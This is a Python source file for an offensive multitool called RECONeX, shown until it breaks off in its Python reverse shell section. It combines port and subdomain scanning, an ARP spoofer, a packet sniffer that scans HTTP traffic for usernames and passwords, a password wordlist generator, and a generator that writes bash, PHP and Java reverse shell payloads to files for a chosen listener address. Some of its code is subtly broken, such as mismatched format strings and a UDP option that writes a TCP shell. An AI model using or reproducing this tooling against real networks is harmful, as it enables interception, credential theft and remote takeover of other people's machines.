from __future__ import print_function
import urllib.request, urllib.error, urllib.parse
import subprocess
from bs4 import BeautifulSoup
import nmap
import re
import socket
from pyfiglet import Figlet
from termcolor import colored
import ipaddress
from datetime import datetime
import requests
import scapy.all as scapy
from scapy.layers import http
import sys
import os
import pyperclip3 as pc
from itertools import product
import time
import readline
def load_animation():

    print('---------------------------------------------')
    load_str = "starting your console framework..."
    ls_len = len(load_str)

    animation = "|/-\\"
    anicount = 0
    counttime = 0
    i = 0

    while (counttime != 100):

        time.sleep(0.075)
        load_str_list = list(load_str)
        x = ord(load_str_list[i])
        y = 0

        if x != 32 and x != 46:
            if x > 90:
                y = x - 32
            else:
                y = x + 32
            load_str_list[i] = chr(y)

        res = ''
        for j in range(ls_len):
            res = res + load_str_list[j]

        sys.stdout.write("\r" + res + animation[anicount])
        sys.stdout.flush()

        load_str = res

        anicount = (anicount + 1) % 4
        i = (i + 1) % ls_len
        counttime = counttime + 1


    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

# Driver program
if __name__ == '__main__':
    load_animation()
print('\n')

#############################################################################################################################################################

def extract_links():
    print("******************************")
    print("*  RECONeX's LINK Extractor  * ")
    print("******************************")
    try:
        url = input("Enter the complete URL :")
        reqs = requests.get(url)
        soup = BeautifulSoup(reqs.text, 'html.parser')

        urls = []
        for link in soup.find_all('a'):
            print("[+]Extracted URLs --->", link.get('href'))

        choice = input("Do you want to continue(y/n):- ")
        if choice == 'y':
            extract_links()
        elif choice == 'n':
            IGoperation()
        else:
            print("Enter y or n:--")

    except KeyboardInterrupt:
        print("\n")
        print("\nCtrl + C pressed............. Quitting. ")
        IGoperation()

def host_2_ip():
    print("*********************************")
    print("*  RECONeX's HOST TO IP Finder  * ")
    print("*********************************")
    try:
        host = input("[+]Enter a Host :")
        ip = socket.gethostbyname(host)
        time.sleep(3)
        print("--------------------------------------------------")
        print("| [+]  %s has the Ip of %s |" % (host, ip))
        print("--------------------------------------------------")
        choice = input("Do you want to continue(y/n):- ")
        if choice == 'y':
            host_2_ip()
        elif choice == 'n':
            IGoperation()
        else:
            print("Enter y or n:--")

    except KeyboardInterrupt:
        print("\n")
        print("\nCtrl + C pressed............. Quitting. ")
        IGoperation()

def port_scan():
    print("****************************")
    print("*  RECONeX's PORT Scanner  *")
    print("****************************")
    try:
        def scan_port():
            ip_add_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
            port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
            port_min = 0
            port_max = 65535
            while True:
                ip_add_entered = input("\nPlease enter the ip address that you want to scan: ")
                try:
                    ip_address_obj = ipaddress.ip_address(ip_add_entered)
                    print("You entered a valid ip address")
                    break
                except:
                    print("You entered an invalid ip address")

            while True:
                port_range = input("Enter port range: ")
                port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
                if port_range_valid:
                    port_min = int(port_range_valid.group(1))
                    port_max = int(port_range_valid.group(2))
                    break

            nm = nmap.PortScanner()
            host_name = socket.gethostbyaddr(ip_add_entered)
            print("-------------------------------------------")
            print("Target IP Address:-", ip_add_entered, host_name)
            print("\nScanning Ports from", port_min, "to", port_max)
            print("\nScanning Initiated.....")
            print("-------------------------------------------")
            print("--------------------------------------------------")
            print("Port No.\t Port Status\t Service Running")
            print("--------------------------------------------------")
            t1 = datetime.now()
            for port in range(port_min, port_max + 1):
                try:
                    result = nm.scan(ip_add_entered, str(port))
                    port_status = (result['scan'][ip_add_entered]['tcp'][port]['state'])
                    service_run = socket.getservbyport(port)
                    if port_status == "open":
                        print(port,"\t\t", port_status ,"\t\t" , service_run)
                    else:
                        print(port, "\t\t", port_status, "\t", service_run)
                except:
                    print(port,"\t\t", port_status ,"\t" ,"Unknown")

            t2 = datetime.now()
            total = t2 - t1
            print("-------------------------------------------")
            print("Scanning Completed in:- ", total)
            print("-------------------------------------------")
            choice = input("Do you want to continue(y/n):- ")
            if choice == 'y':
                port_scan()
                scan_port()
            elif choice == 'n':
                IGoperation()
            else:
                exit()
        scan_port()
    except KeyboardInterrupt:
        print("\n")
        print("\nCtrl + C pressed............. Quitting. ")
        IGoperation()

def banner_grab():
    print("******************************")
    print("*  RECONeX's Banner Grabber  * ")
    print("******************************")
    try:
        host2 = input("Enter the full URL starts with HTTP or HTTPS \n Enter Url Here => :")
        c = urllib.request.urlopen(host2)
        print(c.info())
        print(c.getcode())

        choice = input("Do you want to continue(y/n):- ")
        if choice == 'y':
            banner_grab()
        elif choice == 'n':
            IGoperation()
        else:
            print("Enter y or n:--")


    except KeyboardInterrupt:
        print("\n")
        choice = input("Do you want to continue(y/n):- ")
        if choice == 'y':
            banner_grab()
        elif choice == 'n':
            IGoperation()
        else:
            print("Enter y or n:--")

def subdomain_crawl():
    print("*********************************")
    print("*  RECONeX's Subdomain Crawler  * ")
    print("*********************************")
    def request(target_url):
        try:
            return requests.get("http://" + target_url)
        except requests.exceptions.ConnectionError:
            pass
    target_url = input("Enter the Domain name to scan -->")
    path_to_wordlist = input("Enter Path to Wordlist File -->\t")
    try:
        get_response = requests.get("http://" + target_url)
        with open(path_to_wordlist, "r") as word_list:

            print("----------------------------------------")
            print("|  Subdomain IP     |    Subdomain    | ")
            print("----------------------------------------")
            for line in word_list:
                word = line.strip()
                test_url = word + "." + target_url
                response = request(test_url)
                if response:
                    subdomainIP = socket.gethostbyname(test_url)
                    print(subdomainIP +"\t\t" + test_url)
            print("----------------------------------")
        choice = input("Do you want to continue(y/n):- ")
        if choice == 'y':
            subdomain_crawl()
        elif choice == 'n':
            IGoperation()
        else:
            print("Enter y or n:--")

    except KeyboardInterrupt:
        print("\n")
        choice = input("Do you want to continue(y/n):- ")
        if choice == 'y':
            subdomain_crawl()
        elif choice == 'n':
            IGoperation()
        else:
            print("Enter y or n:--")

def hidden_directory_crawl():
    print("******************************************")
    print("*  RECONeX's Hidden Directories Crawler  * ")
    print("******************************************")
    def request(target_url):
        try:
            return requests.get("http://" + target_url)
        except requests.exceptions.ConnectionError:
            pass
    target_url = input("Enter the Domain name to scan -->\t")
    path_to_wordlist = input("Enter Path to Wordlist File -->\t")
    try:
        get_response = requests.get("http://" + target_url)
        with open( path_to_wordlist, "r") as word_list:
            # name = word_list.read()
            # sub_dom = name.splitlines()
            # print(f"Generated Words:-  {len(sub_dom)}\n")
            print("......Discovering hidden directories.......")
            print("----------------------------------")
            print("|     Discoverd directories      |")
            print("----------------------------------")
            for line in word_list:
                word = line.strip()
                test_url = target_url + "/" + word
                response = request(test_url)
                if response:
                    print("http://"+    test_url)
            print("----------------------------------")

        choice = input("Do you want to continue(y/n):- ")
        if choice == 'y':
            hidden_directory_crawl()
        elif choice == 'n':
            IGoperation()
        else:
            print("Enter y or n:--")


    except KeyboardInterrupt:
        print("\n")
        choice = input("Do you want to continue(y/n):- ")
        if choice == 'y':
            hidden_directory_crawl()
        elif choice == 'n':
            IGoperation()
        else:
            print("Enter y or n:--")
        IGoperation()

def IGoperation():
    os.system("clear")
    f = Figlet(font='slant' , width = 200)
    print(colored(f.renderText('RECONeX'), 'green'))
    print('----------------------------------------------------')
    print('| A MULTITOOL FOR INFO. GATHERING , EXPLOITATION & |')
    print('|                Man In The Middle                 |')
    print('----------------------------------------------------\n')
    print('\t\t\t\t\t\tAuthor -  MANAV SHARMA\n')
    print("----------------------------------------")
    print("|     Information Gathering Menu       |")
    print("----------------------------------------")
    print("{1} Host To IP Finder                  |")
    print("{2} Port Scanner                       |")
    print("{3} Hidden Files & Directories Crawler |")
    print("{4} Subdomain Crawler                  |")
    print("{5} Extract Links from Website         |")
    print("{6} Banner Grabbing                    |")
    print("{7} Exit from Info. Gather. Mode       |")
    print("----------------------------------------")
    choose = input("Enter your choice:-")
    if choose == '1':
        host_2_ip()
    elif choose == '2':
        port_scan()
    elif choose == '3':
        hidden_directory_crawl()
    elif choose == '4':
        subdomain_crawl()
    elif choose == '5':
        extract_links()
    elif choose == '6':
        banner_grab()
    elif choose == '7':
        grandoperation()
    elif choose == 'ls':
        os.system("ls")
        time.sleep(5)
        IGoperation()
    elif choose == 'pwd':
        os.system("pwd")
        time.sleep(5)
        IGoperation()
    else:
        print("Enter Valid Input")
        IGoperation()

###################################################################END OF RECON SUITE#######################################################################

##########################################################START OF MITM SUITE###########################################################
def arp_spoof():
    print("***************************")
    print("* RECONeX's ARP Spoofer *")
    print("***************************")

    def mac(ipadd):
        arp_request = scapy.ARP(pdst=ipadd)
        br = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_req_br = br / arp_request
        list_1 = scapy.srp(arp_req_br, timeout=5, verbose=False)[0]
        return list_1[0][1].hwsrc

    def spoof(targ, spoof):
        packet = scapy.ARP(op=2, pdst=targ, hwdst=mac(targ),
                           psrc=spoof)
        scapy.send(packet, verbose=False)

    def reset(dest_ip, src_ip):
        dest_mac = mac(dest_ip)
        source_mac = mac(src_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=source_mac)
        scapy.send(packet, verbose=False)

    target_ip = input("[*] Enter Target IP > ")  # Enter your target IP
    gateway_ip = input("[*] Enter Gateway IP > ")  # Enter your gateway's IP
    print("**************")
    print("Attack Initiated....")
    try:
        countpackets = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            countpackets = countpackets + 1
            print("\r[*] Packets Sent " + str(countpackets), end="")
            time.sleep(2)


    except KeyboardInterrupt:
        print("\n")
        print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
        print("\nCtrl + C pressed............. Quitting. ")
        reset(gateway_ip, target_ip)
        reset(target_ip, gateway_ip)
        print("[*] Arp Spoof Stopped, IP restored. ")
        choice = input("Do you want to continue(y/n):- ")
        if choice == 'y':
            arp_spoof()
        elif choice == 'n':
            MITMoperation()
        else:
            print("Enter y or n:--")

def packet_sniff():
    print("******************************")
    print("* RECONeX's Packet_sniffer *")
    print("******************************")
    try:
        interface = str(input("Specify the interface to sniff:- "))
        print("Sniffing the Interface :-" + interface)

        def sniff(interface):
            scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80" or "port 443")

        def geturl(packet):
            return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

        def get_login_info(packet):
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keywords = ['login', 'LOGIN', 'user', 'pass', 'Username', 'Password', 'Login']
                for keyword in keywords:
                    if keyword in load:
                        return load

        def process_sniffed_packet(packet):
            if packet.haslayer(http.HTTPRequest):
                url = geturl(packet)
                print("[+]HTTPRequest > " + url.decode("utf-8"))
                logininfo = get_login_info(packet)
                if logininfo:
                    print("\n\n[+]Possible username and password " + string.decode(logininfo) + "\n\n")

        sniff(interface)

    except KeyboardInterrupt:
        print("\n")
        print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
        print("\nCtrl + C pressed............. Quitting. ")
        print("[*] Sniffing Stopped........ ")
        choice = input("Do you want to continue(y/n):- ")
        if choice == 'y':
            packet_sniff()
        elif choice == 'n':
            MITMoperation()
        else:
            print("Enter y or n:--")

def network_scan():
    print("*******************************")
    print("* RECONeX's Network Scanner *")
    print("*******************************")
    try:
        target = input("Specify the IP of the target OR Range of Ip to scan:-- ")

        def scan(ip):
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            clients_list = []
            for element in answered_list:
                client_dictionary = {"ip": element[1].psrc, "mac": element[1].hwsrc}
                clients_list.append(client_dictionary)
            return clients_list

        def print_result(result_list):
            print("\tIP\t\tMAC Address\n..............................................")
            for client in result_list:
                print("\t" +client["ip"] + "\t" + client["mac"])

        scan_result = scan(target)
        print_result(scan_result)

    except KeyboardInterrupt:
        print("\n")
        print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
        print("\nCtrl + C pressed............. Quitting. ")
        print("[*] Network Scanning Stopped. ")


def MITMoperation():
    os.system("clear")

    f = Figlet(font='slant' , width = 200)
    print(colored(f.renderText('RECONeX'), 'green'))
    print('----------------------------------------------------')
    print('| A MULTITOOL FOR INFO. GATHERING , EXPLOITATION & |')
    print('|                Man In The Middle                 |')
    print('----------------------------------------------------\n')
    print('\t\t\t\t\t\tAuthor -  MANAV SHARMA\n')
    print(colored(' Suggested :- Use Multiple terminals to use M.I.T.M. Tools' , 'yellow'))
    time.sleep(2)
    choose = 0
    while(choose != '5'):
        time.sleep(1)
        print("-------------------------------")
        print("|   MaN In THe MiDdLe Menu    |")
        print("-------------------------------")
        print("{1} Network Scanner           |")
        print("{2} ARP Spoofer               |")
        print("{3} Packet Sniffer            |")
        print("{4} Wireless Exploitation     |")
        print("{5} Exit from Attack Mode     |")
        print("-------------------------------")
        choose = input("Enter your choice:-")
        if choose == '1':
            network_scan()
        elif choose == '2':
            arp_spoof()
        elif choose == '3':
            packet_sniff()
        elif choose == '4':
            wirelessexp()
        elif choose == 'ifconfig':
            os.system("ifconfig")
            time.sleep(5)
            MITMoperation()
        elif choose == 'ls':
            os.system("ls")
            time.sleep(5)
            MITMoperation()
        elif choose == 'pwd':
            os.system("pwd")
            time.sleep(5)
            MITMoperation()
        elif choose == 'iwconfig':
            os.system("iwconfig")
            time.sleep(5)
            MITMoperation()
        elif choose == '5':
            subprocess.call(["service", "apache2", "stop"])
            time.sleep(2)
            print(colored("Man in the Middle Attack [MODE OFF]", 'green'))
            grandoperation()
        else:
            print("Enter Valid Input")
            MITMoperation()

#################################################END OF MITM SUITE##############################################################################

#################################################START OF EXPLOITATION SUITE########################################################################

dictionary = { 'a': ['a','A','@','4'],'b': ['b','B','8','6'],'c': ['c','C','[','{','(','<'], 'd': ['d','D',], 'e': ['e','E','3'], 'f': ['f','F'], 'g': ['g','G','6','9'], 'h': ['h','H','#'], 'i': ['i','I','1','l','L','|','!'], 'j': ['j','J'], 'k': ['k','K'], 'l': ['l','L','i','I','|','!','1'], 'm': ['m','M'], 'n': ['n','N'], 'o': ['o','O','0','Q'], 'p': ['p','P'], 'q': ['q','Q','9','0','O'], 'r': ['r','R'], 's': ['s','S','$','5'], 't': ['t','T','+','7'], 'u': ['u','U','v','V'], 'v': ['v','V','u','U'], 'w': ['w','W'], 'x': ['x','X','+'], 'y': ['y','Y'], 'z': ['z','Z','2'], }
dummychars = ['1','2','3','4','5','6','7','8','9','0','!','@','#','$','%','^','&','*','?']
specialchars = ['!','@','#','$','%','^','&','*','?']
numericals = ['1','2','3','4','5','6','7','8','9','0']

def fullSub():
	try:
		password = input("Enter password format:-")
		letters = []
		for val in password:
			if val in dictionary.keys():
				letters.append(dictionary[val])
			else:
				letters.append(val)
		a = [''.join(item) for item in product(*letters)]
		print("What to do with result?")
		print("1. print Output on screen\n2. Copy output to clipboard\n3. Copy output in file")
		printoptionschoice = input("Your Choice >")
		if printoptionschoice == '1':
			print (a)
			print ('%s passwords generated.' % len(a))

		elif printoptionschoice == '2':
			pwList = '\n'.join(a)
			print ('%s passwords copied to the clipboard.' % (len(a)))
			pc.copy(pwList)

		elif printoptionschoice == '3':
			outputFile = input("Enter Output File Name:-")
			with open(outputFile, 'w') as f:
				f.write('\n'.join(a))
			print ('%s passwords written to %s' % (len(a), outputFile))
			f.close()
		else:
			print("Enter Valid choice")
			fullSub()
		choice = input("Do you want to continue(y/n):- ")
		if choice == 'y':
			fullSub()
		elif choice == 'n':
			keygen()
		else:
			print("Enter y or n:--")

	except KeyboardInterrupt:
		print("\n")
		print("\nCtrl + C pressed............. Quitting. ")
		keygen()
def basicgen():
	try:
		password = input("Enter password format:-")
		numbers = False
		numCombos = [''.join(password) for n in range(1, 5) for password in product(numericals, repeat=n)]
		characterList = numCombos if numbers else dummychars
		a = []
		middle = password[1:]
		replacements = product(dictionary[password[0]], characterList)
		for val in replacements:
			a.append(val[0] + middle + val[1])
		print("What to do with result?")
		print("1. print Output on screen\n2. Copy output to clipboard\n3. Copy output in file")
		printoptionschoice = input("Your Choice >")
		if printoptionschoice == '1':
			print (a)
			print ('%s passwords generated.' % len(a))

		elif printoptionschoice == '2':
			pwList = '\n'.join(a)
			print ('%s passwords copied to the clipboard.' % (len(a)))
			pc.copy(pwList)

		elif printoptionschoice == '3':
			outputFile = input("Enter Output File Name:-")
			with open(outputFile, 'w') as f:
				f.write('\n'.join(a))
			print ('%s passwords written to %s' % (len(a), outputFile))
			f.close()

		else:
			print("Enter Valid choice")
			basicgen()
		choice = input("Do you want to continue(y/n):- ")
		if choice == 'y':
			basicgen()
		elif choice == 'n':
			keygen()
		else:
			print("Enter y or n:--")

	except KeyboardInterrupt:
		print("\n")
		print("\nCtrl + C pressed............. Quitting. ")
		keygen()
def passwithnumber():
	try:
		password = input("Enter password format:-")
		numbers = True
		numCombos = [''.join(password) for n in range(1, 5) for password in product(numericals, repeat=n)]
		characterList = numCombos if numbers else dummychars
		a = []
		middle = password[1:]
		replacements = product(dictionary[password[0]], characterList)
		for val in replacements:
			a.append(val[0] + middle + val[1])
		print("What to do with result?")
		print("1. print Output on screen\n2. Copy output to clipboard\n3. Copy output in file")
		printoptionschoice = input("Your Choice >")
		if printoptionschoice == '1':
			print (a)
			print ('%s passwords generated.' % len(a))

		elif printoptionschoice == '2':
			pwList = '\n'.join(a)
			print ('%s passwords copied to the clipboard.' % (len(a)))
			pc.copy(pwList)

		elif printoptionschoice == '3':
			outputFile = input("Enter Output File Name:-")
			with open(outputFile, 'w') as f:
				f.write('\n'.join(a))
			print ('%s passwords written to %s' % (len(a), outputFile))
			f.close()

		else:
			print("Enter Valid choice")
			passwithnumber()

		choice = input("Do you want to continue(y/n):- ")
		if choice == 'y':
			passwithnumber()
		elif choice == 'n':
			keygen()
		else:
			print("Enter y or n:--")

	except KeyboardInterrupt:
		print("\n")
		print("\nCtrl + C pressed............. Quitting. ")
		keygen()
def keygen():
	time.sleep(2)
	choose = 0
	try:
		while (choose != '4'):
			time.sleep(1)
			print("--------------------------------------------------")
			print("|            Password Production Menu            |")
			print("--------------------------------------------------")
			print("{1} Generate list of every possible combination  |")
			print("{2} Generate list of basic combination           |")
			print("{3} Generate list with numericals after password |")
			print("{4} Exit from tool                               |")
			print("--------------------------------------------------")
			choose = input("Enter your choice:-")
			if choose == '1':
				fullSub()
			elif choose == '2':
				basicgen()
			elif choose == '3':
				passwithnumber()
			elif choose == '4':
				ExploitOperation()
			elif choose == 'clear':
				os.system('clear')
			elif choose == 'ifconfig':
				os.system('ifconfig')
			elif choose == 'exit':
				os.system('Ctrl+c')
				sys.exit(0)
			else:
				print("Enter Valid Input")
				keygen()

	except KeyboardInterrupt:
		time.sleep(2)
		print("\nCtrl + C pressed.............Exiting")
		time.sleep(2)
		print("[+] Process  Terminated.........")

def revgen():
    try:
        print("-------------------------------------------------------------------")
        print("|                      Available Reverse Shells                   |")
        print("-------------------------------------------------------------------")
        print("""|1. bash reverse shell      2. php reverse shell                  |
| 3. java reverse shell     4. python reverse shell (for Linux)   |
| 5. Back to menu                                                 |""")
        print("-------------------------------------------------------------------")
        Shelltype = input("Shell#\t")
        if Shelltype == '1':
            bashshell()
        elif Shelltype == '2':
            phpshell()
        elif Shelltype == '3':
            javashell()
        elif Shelltype == '4':
            pythonshell()
        elif Shelltype == '5':
            ExploitOperation()
        elif Shelltype == 'clear':
            os.system('clear')
            revgen()
        elif Shelltype == 'ifconfig':
            os.system('ifconfig')
            revgen()
        elif Shelltype == 'exit':
            os.system('Ctrl+c')
            sys.exit()
        else:
            print("Enter b/w 1-9>>\t")
            revgen()
    except KeyboardInterrupt:
        pass


def bashshell():
    try:
        print("-------------------------------")
        print("|  Available Payloads (Bash)  |")
        print("-------------------------------")
        print("|   1. Bash TCP    |")
        print("|   2. Bash UDP    |")
        print("|   3. Back        |")
        print("--------------------")
        bashpayload = input("Use Payload Type:-")
        if bashpayload == '1':
            bashshellTCP()
        elif bashpayload == '2':
            bashshellUDP()
        elif bashpayload == '3':
            revgen()
        else:
            print("Enter Valid Input")
            bashshell()
    except KeyboardInterrupt:
        revgen()
def bashshellTCP():
    try:
        print("---------------------")
        print("|  Bash TCP Shells  |")
        print("---------------------")
        print("""(A) bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
(B)0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196
(C)/bin/bash -l > /dev/tcp/{IP}/{PORT} 0<&1 2>&1""")
        while True:
            lhost = input("Please enter the ip address to listen from(e.g. 0.0.0.0.) :-")
            try:
                ip_address_obj = ipaddress.ip_address(lhost)
                print("Valid IP address")
                break
            except:
                print("Invalid IP address")

        lport = input("Please enter the listener port(from 0-65536):-")
        bashshellTCPchoice = input("Use shell no.>\t")
        if bashshellTCPchoice == '1':
            shell = ("bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost , lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.sh', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.sh' % outputFile)
        elif bashshellTCPchoice == '2':
            shell = ("0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196" % (lhost , lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.sh', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.sh' % outputFile)
        elif bashshellTCPchoice == '3':
            shell = ("/bin/bash -l > /dev/tcp/%s/%s 0<&1 2>&1" % (lhost , lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.sh', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.sh' % outputFile)
        else:
            print("These are the only available shell scripts")
            bashshellTCP()

        choice = input("Want to Continue? (y/n/exit):\t ")
        if choice == 'y':
            bashshellTCP()
        elif choice == 'n':
            bashshell()
        elif choice == 'exit':
            revgen()
        else:
            print("bkbsk")

    except KeyboardInterrupt:
        print("\n")
        print("\nCtrl + C pressed............. Quitting. ")
        ExploitOperation()
def bashshellUDP():
    try:
        print("---------------------")
        print("|  Bash UDP Shells  |")
        print("---------------------")
        print("(A) sh -i >& /dev/udp/{IP}/{PORT} 0>&1 ")
        while True:
            lhost = input("Please enter the ip address to listen from(e.g. 0.0.0.0.) :-")
            try:
                ip_address_obj = ipaddress.ip_address(lhost)
                print("Valid IP address")
                break
            except:
                print("Invalid IP address")

        lport = input("Please enter the listener port(from 0-65536):-")
        shell = ("bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost , lport))
        outputFile = input("Enter Shell file Name:-")
        with open(outputFile + '.sh', 'w') as f:
            f.write(''.join(shell))
        print('Reverse shell is generated as %s.sh' % outputFile)
        choice = input("Want to Continue? (y/n/exit):\t ")
        if choice == 'y':
            bashshellUDP()
        elif choice == 'n':
            bashshell()
        elif choice == 'exit':
            sys.exit()
        else:
            print("bkbsk")

    except KeyboardInterrupt:
        print("\n")
        print("\nCtrl + C pressed............. Quitting. ")
def phpshell():
    try:
        print("------------------------------")
        print("|  Available Payloads (PHP)  |")
        print("------------------------------")
        print("""(A)php -r '$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'
(B)php -r '$sock=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
(C)php -r '$sock=fsockopen("{IP}",{PORT});`/bin/sh -i <&3 >&3 2>&3`;'
(D)php -r '$sock=fsockopen("{IP}",{PORT});system("/bin/sh -i <&3 >&3 2>&3");'
(E)php -r '$sock=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");'
(F)php -r '$sock=fsockopen("{IP}",{PORT});popen("/bin/sh -i <&3 >&3 2>&3", "r");'
(G)php -r '$sock=fsockopen("{IP}",{PORT});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""")
        while True:
            lhost = input("Please enter the ip address to listen from(e.g. 0.0.0.0.) :-")
            try:
                ip_address_obj = ipaddress.ip_address(lhost)
                print("Valid IP address")
                break
            except:
                print("Invalid IP address")

        lport = input("Please enter the listener port(from 0-65536):-")
        phpshellchoice = input("Use shell no.>\t")
        if phpshellchoice == '1':
            shell = ("""php -r '$sock=fsockopen("%s",80);" exec "/bin/sh -i <&3 >&3 2>&3" ;'""" % (lhost , lport) )
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.php', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.php' % outputFile)

        elif phpshellchoice == '2':
            shell = ("""php -r '$sock=fsockopen("%s",80);shell_exec("/bin/sh -i <&3 >&3 2>&3");'""" % ( lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.php', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.php' % outputFile)

        elif phpshellchoice == '3':
            shell = ("""php -r '$sock=fsockopen("%s",%s);`/bin/sh -i <&3 >&3 2>&3`;'""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.php', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.php' % outputFile)

        elif phpshellchoice == '4':
            shell = ("""php -r '$sock=fsockopen("%s",%s);system("/bin/sh -i <&3 >&3 2>&3");'""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.php', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.php' % outputFile)

        elif phpshellchoice == '5':
            shell = ("""php -r '$sock=fsockopen("%s",%s);passthru("/bin/sh -i <&3 >&3 2>&3");'""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.php', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.php' % outputFile)

        elif phpshellchoice == '6':
            shell = ("""php -r '$sock=fsockopen("%s",%s);popen("/bin/sh -i <&3 >&3 2>&3", "r");'""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.php', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.php' % outputFile)

        elif phpshellchoice == '7':
            shell = ("""php -r '$sock=fsockopen("%s",%s);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.php', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.php' % outputFile)

        else:
            print("These are the only available shell scripts")
            phpshell()

        choice = input("Want to Continue? (y/n/exit):\t ")
        if choice == 'y':
            phpshell()
        elif choice == 'n':
            ExploitOperation()
        elif choice == 'exit':
            grandoperation()
        else:
            print("Enter either y or n")

    except KeyboardInterrupt:
        print("\n")
        print("\nCtrl + C pressed............. Quitting. ")
    except KeyboardInterrupt:
        ExploitOperation()
def javashell():
    try:
        print("------------------------------")
        print("|  Available Shells (Java)  |")
        print("------------------------------")
        print("""1. Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
2. String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""")
        while True:
            lhost = input("Please enter the ip address to listen from(e.g. 0.0.0.0.) :-")
            try:
                ip_address_obj = ipaddress.ip_address(lhost)
                print("Valid IP address")
                break
            except:
                print("Invalid IP address")

        lport = input("Please enter the listener port(from 0-65536):-")
        javashellchoice = input("Use shell no.>\t")
        if javashellchoice == '1':
            shell = ("""Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor()""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.java', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.java' % outputFile)
        elif javashellchoice == '2':
            shell = ("""String host="%s";
int port=%s;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""" % (
            lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.java', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.java' % outputFile)
        else:
            print("These are the only available shell scripts")
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile + '.java', 'w') as f:
                f.write(''.join(shell))
            print('Reverse shell is generated as %s.java' % outputFile)

        choice = input("Want to Continue? (y/n/exit):\t ")
        if choice == 'y':
            javashell()
        elif choice == 'n':
            revgen()
        elif choice == 'exit':
            ExploitOperation()
        else:
            print("bkbsk")

    except KeyboardInterrupt:
        print("\n")
        print("\nCtrl + C pressed............. Quitting. ")
    ExploitOperation()

def pythonshell():
    try:
        print("---------------------------------")
        print("|  Available Payloads (Python)  |")
        print("---------------------------------")
